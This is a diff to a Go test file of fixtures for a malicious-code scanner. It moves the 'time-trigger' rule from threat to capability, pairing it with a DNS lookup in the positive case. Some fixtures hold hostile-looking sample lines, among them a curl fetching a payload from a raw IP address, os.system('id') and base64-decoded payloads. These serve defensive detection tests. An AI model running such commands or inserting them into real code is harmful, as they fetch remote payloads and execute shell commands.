@@ -46,7 +46,9 @@ var corePositives = []fixture{
 	// package-manager is a capability now, so the fixture needs a threat to
 	// pair with. socket.gethostbyname trips dns-ops, which remains a threat.
 	{"package-manager", "setup.sh", "pip install requests\nsocket.gethostbyname(payload)"},
-	{"time-trigger", "bomb.py", `time.sleep(86400)`},
+	// time-trigger is a capability now, so the fixture needs a threat to
+	// pair with. socket.gethostbyname trips dns-ops, which remains a threat.
+	{"time-trigger", "bomb.py", "time.sleep(86400)\nsocket.gethostbyname(payload)"},
 	{"dynamic-import", "load.py", `mod = __import__("os")`},
 	{"suspicious-network", "beacon.sh", `curl http://185.220.101.5/payload`},
 	// websocket is a capability now, so the fixture needs a threat to pair
@@ -190,6 +192,7 @@ var coreNegatives = []fixture{
 	{"eval-exec", "lone.py", `os.system("id")`},
 	{"base64", "lone.py", `payload = base64.b64decode(blob)`},
 	{"websocket", "lone.js", `const c = new WebSocket("wss://example.com");`},
+	{"time-trigger", "lone.py", `time.sleep(86400)`},
 
 	// Agent rules are scoped to agent paths; the same content in ordinary
 	// project files must not fire.
